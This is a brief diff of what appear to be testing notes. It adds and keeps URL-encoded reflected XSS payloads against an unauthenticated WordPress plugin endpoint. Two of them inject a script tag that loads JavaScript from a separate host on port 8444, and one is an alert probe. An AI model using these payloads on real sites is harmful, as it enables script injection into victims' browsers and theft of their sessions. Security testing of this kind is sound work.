@@ -28,9 +28,10 @@ bs4
 
 https://targetapp.possiblymalware.com/wp-content/plugins/sketchyPlugin/unauthXSS.php?param=%3Cscript%20src=%27https://192.168.2.61:8444/lib/telemlib.js%27%3E%3C/script%3E
 
-
+https://targetapp.possiblymalware.com/wp-content/plugins/sketchyPlugin/unauthXSS.php?param=%3Cscript%20src=%27https://127.0.0.1:8444/lib/telemlib.js%27%3E%3C/script%3E
 
 
 
 https://targetapp.possiblymalware.com/wp-content/plugins/sketchyPlugin/unauthXSS.php?param=%3Cscript%3Ealert(%27XSS%27)%3C/script%3E
+
 
